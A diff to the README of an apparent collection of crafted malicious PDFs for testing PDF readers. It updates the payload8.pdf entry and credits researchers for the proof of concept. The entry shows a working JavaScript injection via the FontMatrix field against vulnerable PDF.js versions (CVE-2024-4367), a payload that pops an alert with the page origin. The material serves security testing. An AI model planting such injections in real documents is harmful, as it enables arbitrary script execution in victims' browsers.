@@ -91,9 +91,9 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 
 ### payload8.pdf
 
-**Line 49**. Try to run arbitrary Javascript injected via FontMatrix. It works on vulnerable PDF.js versions.
+**Line 19**. Try to run arbitrary Javascript injected via `FontMatrix`. It works on vulnerable `PDF.js` versions. Proof-of-Concept created by [Rob Wu and Thomas Rinsma](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/).
 ```
-/FontMatrix [1 2 3 4 5 (1\); alert\('origin: '+window.origin+'\\npdf url: '+window.PDFViewerApplication.url)]
+<< /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R /FontMatrix [ 1 2 3 4 5 (1\); alert\('origin: '+window.origin+', pdf url: '+\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\)) ] /Subtype /Type1 /Type /Font >>
 ```
 
 ___
